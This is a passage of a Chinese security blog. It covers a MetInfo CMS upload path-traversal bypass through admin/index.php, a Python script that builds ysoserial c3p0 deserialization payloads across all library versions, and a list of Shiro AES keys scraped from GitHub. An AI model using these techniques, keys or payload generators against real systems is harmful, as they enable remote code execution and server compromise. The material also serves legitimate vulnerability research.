<p>在该方法当中,会将\替换为/,并且如果替换后的字符串不等于替换前的字符串那么将会直接被设置为’’<br>所以savepath被置空,文件就被保存到了upload目录当中。<br>不过这里是可以绕过的,如果能够找到一个设置了IN_ADMIN常量并且能够加载任意类的文件就能够绕过sqlinsert。</p>
<p>admin/index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;IN_ADMIN&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$M_MODULE=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">&#x27;m&#x27;</span>])$M_MODULE=$_GET[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">&#x27;n&#x27;</span>])$_GET[<span class="string">&#x27;n&#x27;</span>]=<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">&#x27;c&#x27;</span>])$_GET[<span class="string">&#x27;c&#x27;</span>]=<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">&#x27;a&#x27;</span>])$_GET[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&quot;doindex&quot;</span>;</span><br><span class="line">@define(<span class="string">&#x27;M_NAME&#x27;</span>, $_GET[<span class="string">&#x27;n&#x27;</span>]);</span><br><span class="line">@define(<span class="string">&#x27;M_MODULE&#x27;</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">&#x27;M_CLASS&#x27;</span>, $_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">@define(<span class="string">&#x27;M_ACTION&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../app/system/entrance.php&#x27;</span>;</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该文件中,设置了IN_ADMIN常量并且可以自己控制加载的module、class等且无权限验证,所以使用这个文件来加载uploadify类实现上传就能够绕过sqlinsert使用..\实现目录穿越。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>打个码, 需要的自己调一下代码吧。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_7.jpg" alt="-w1292"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/"><span>Generate all unserialize payload via serialVersionUID</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-01T15:12:02.000Z">
          2019-04-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近遇到了个shiro老版本的反序列漏洞, 但是只能在用URLDNS的时候能成功, 除了CommonsCollections在shiro上是不行的, 使用其他gadget的时候也失败了, 怀疑有SUID的原因。<br>java在打反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常。<br>在目标出现异常时, 如果会输出异常信息并且爆出SUID的情况下解决起来比较容易。<br>但是在通常场景下, 目标服务器都不会输出异常信息,<br>SUID不同原因基本都是因为jar包版本不同所造成(在未显示定义serialVersionUID的情况下, 会通过computeDefaultSUID来计算得出SUID, 不同版本jar包可能存在不同的方法导致算出的SUID不同),<br>在不会输出异常信息的场景下, 由于不知道目标服务器jar包的SUID, 所以只有使用所有可能的SUID来生成反序列payload一个一个的进行尝试,<br>所以这里通过获取所有jar包版本并且调用这些版本的jar包来生成反序列payload。</p>
<h2 id="Shiro-AES-key"><a href="#Shiro-AES-key" class="headerlink" title="Shiro AES key"></a>Shiro AES key</h2><p>Shiro的反序列payload在经过base64解码, aes解密后才会进行反序列。<br>老版本shiro因为硬编码了默认AES的秘钥导致了问题, 但是很多时候遇到的并不都是默认的秘钥。不过很多代码都是抄抄改改, 所以从github上爬下来了一些用得比较多的的秘钥。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;    :   190</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;    :   157</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;    :   135</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;    :   114</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;    :   35</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;    :   27</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;    :   9</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;    :   9</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;    :   8</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;    :   5</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;    :   5</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;    :   4</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda       :   4</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;    :   4</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;    :   3</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;    :   3</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;    :   3</span><br><span class="line">LEGEND-CAMPUS-CIPHERKEY&#x3D;&#x3D;   :   3</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag &#x3D;&#x3D;   :   3</span><br></pre></td></tr></table></figure>


<h2 id="Generate-payload"><a href="#Generate-payload" class="headerlink" title="Generate payload"></a>Generate payload</h2><p>Ysoserial是一个maven项目, 从github上clone下来后首先编译该项目。<br><code>git clone https://github.com/frohoff/ysoserial</code><br><code>mvn compile</code><br>compile会编译该项目并且下载该项目所需要的jar包, 编译生成的字节码在target目录当中。<br>这里通过修改classpath来实现加载不同版本的jar包,<br>在classpath中, 两个不同版本的jar包, 实际项目中会调用的是先定义的jar包。<br>所以这里在修改classpath时, 将需要修改版本的jar包定义在最前, 覆盖掉ysoserial自带的jar包。<br>写了一个很糙的 勉强能用的小脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">repo_url = <span class="string">&quot;http://uk.maven.org/maven2/com/mchange/c3p0/maven-metadata.xml&quot;</span></span><br><span class="line">mvn_home = <span class="string">&quot;/Users/yulegeyu/.m2/repository&quot;</span></span><br><span class="line">yso_path = <span class="string">&quot;/tmp/ysoserial/target/classes&quot;</span></span><br><span class="line">gadget = <span class="string">&quot;C3P0&quot;</span></span><br><span class="line">command = <span class="string">&quot;http://www.baidu.com | base64&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(repo_url)</span><br><span class="line"></span><br><span class="line">html = res.content</span><br><span class="line">root = parseString(html.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">groupId = root.getElementsByTagName(<span class="string">&quot;groupId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">artifactId = root.getElementsByTagName(<span class="string">&quot;artifactId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root.getElementsByTagName(<span class="string">&quot;version&quot;</span>):</span><br><span class="line">    version = i.firstChild.data</span><br><span class="line">    <span class="keyword">if</span> version.find(<span class="string">&#x27;-pre&#x27;</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    jar_path = mvn_home + <span class="string">&#x27;/&#x27;</span> + groupId.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;/&#x27;</span> + version + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;-&#x27;</span> + version + <span class="string">&#x27;.jar&#x27;</span></span><br><span class="line">    cmd = <span class="string">&quot;mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s&quot;</span> \</span><br><span class="line">          % (groupId, artifactId, version)</span><br><span class="line">    child = Popen(cmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    child.wait()</span><br><span class="line"></span><br><span class="line">    cmd2 = <span class="string">&quot;java -cp &#123;0&#125;:&#123;2&#125;:&#123;1&#125;/net/iharder/base64/2.3.9/base64-2.3.9.jar:&#123;1&#125;/commons-io/commons-io/2.6/commons-io-2.6.jar:&#123;1&#125;/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:&#123;1&#125;/com/google/guava/guava/15.0/guava-15.0.jar:&#123;1&#125;/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:&#123;1&#125;/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:&#123;1&#125;/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:&#123;1&#125;/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:&#123;1&#125;/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:&#123;1&#125;/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:&#123;1&#125;/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:&#123;1&#125;/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:&#123;1&#125;/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:&#123;1&#125;/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:&#123;1&#125;/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:&#123;1&#125;/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:&#123;1&#125;/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:&#123;1&#125;/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:&#123;1&#125;/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:&#123;1&#125;/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:&#123;1&#125;/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:&#123;1&#125;/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:&#123;1&#125;/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:&#123;1&#125;/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:&#123;1&#125;/commons-beanutils/commons-beanutils/1.9.2/commons-beanutils-1.9.2.jar:&#123;1&#125;/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:&#123;1&#125;/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:&#123;1&#125;/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:&#123;1&#125;/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:&#123;1&#125;/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:&#123;1&#125;/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:&#123;1&#125;/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:&#123;1&#125;/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:&#123;1&#125;/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:&#123;1&#125;/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:&#123;1&#125;/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:&#123;1&#125;/antlr/antlr/2.7.7/antlr-2.7.7.jar:&#123;1&#125;/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:&#123;1&#125;/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:&#123;1&#125;/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:&#123;1&#125;/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:&#123;1&#125;/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:&#123;1&#125;/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:&#123;1&#125;/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:&#123;1&#125;/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:&#123;1&#125;/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:&#123;1&#125;/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:&#123;1&#125;/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:&#123;1&#125;/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:&#123;1&#125;/xalan/xalan/2.7.2/xalan-2.7.2.jar:&#123;1&#125;/xalan/serializer/2.7.2/serializer-2.7.2.jar:&#123;1&#125;/rome/rome/1.0/rome-1.0.jar:&#123;1&#125;/jdom/jdom/1.0/jdom-1.0.jar:&#123;1&#125;/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:&#123;1&#125;/rhino/js/1.7R2/js-1.7R2.jar:&#123;1&#125;/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:&#123;1&#125;/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:&#123;1&#125;/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:&#123;1&#125;/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:&#123;1&#125;/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:&#123;1&#125;/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:&#123;1&#125;/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:&#123;1&#125;/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:&#123;1&#125;/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:&#123;1&#125;/javax/inject/javax.inject/1/javax.inject-1.jar:&#123;1&#125;/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:&#123;1&#125;/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:&#123;1&#125;/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:&#123;1&#125;/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:&#123;1&#125;/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:&#123;1&#125;/org/w3c/css/sac/1.3/sac-1.3.jar:&#123;1&#125;/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:&#123;1&#125;/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:&#123;1&#125;/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:&#123;1&#125;/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar&quot;</span> \</span><br><span class="line">           <span class="string">&quot; ysoserial.GeneratePayload &#123;3&#125; &#123;4&#125;&quot;</span>.<span class="built_in">format</span>(yso_path, mvn_home, jar_path, gadget, command)</span><br><span class="line">    print(version)</span><br><span class="line">    os.system(cmd2)</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ge_1.jpg" alt="-w1351"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/09/Modify-Ysoseriali-jar-serialVersionUID/"><span>Modify ysoserial jar serialVersionUID</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/09/Modify-Ysoseriali-jar-serialVersionUID/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-09T04:43:06.000Z">
          2019-03-09
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Java在反序列时, 会把传来的字节流中的serialVersionUID与本地对应类的serialVersionUID进行校验, 在两个SUID不同的情况下, 会抛出版本号不同的异常, 不再进行反序列。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (model.serializable == osc.serializable &amp;&amp;</span><br><span class="line">        !cl.isArray() &amp;&amp;</span><br><span class="line">        suid != osc.getSerialVersionUID()) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(osc.name,</span><br><span class="line">            <span class="string">&quot;local class incompatible: &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;stream classdesc serialVersionUID = &quot;</span> + suid +</span><br><span class="line">                    <span class="string">&quot;, local class serialVersionUID = &quot;</span> +</span><br><span class="line">                    osc.getSerialVersionUID());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之前做JEECMS的反序列的时候, 解决C3P0 SUID不同的方法是直接通过修改Ysoeriali C3P0 JAR包的版本与目标环境的JAR包版本一致使SUID一致。<br>最近闲得想试试通过反射来修改Ysoeriali JAR包的SUID来使SUID一致进行反序列。</p>
<h2 id="类未定义serialVersionUID属性"><a href="#类未定义serialVersionUID属性" class="headerlink" title="类未定义serialVersionUID属性"></a>类未定义serialVersionUID属性</h2><p>测试Jar包 服务端 C3P0 0.9.1.1、ysoserial C3P0 0.9.5.2,<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_1.jpg" alt="-w927"><br>提示本地jar包的SUID为7387108436934414104<br>而字节流的SUID为-2440162180985815128, SUID不一致爆出异常。</p>
<p>在com.mchange.v2.c3p0.PoolBackedDataSource类中,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSource</span> <span class="keyword">extends</span> <span class="title">AbstractPoolBackedDataSource</span> <span class="keyword">implements</span> <span class="title">PooledDataSource</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(<span class="keyword">boolean</span> autoregister)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(autoregister);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(String configName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(configName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>未定义serialVersionUID属性。</p>
<p>如果序列化的类里没有显示定义serialVersionUID属性, 那么会通过computeDefaultSUID方法计算得出SUID。</p>
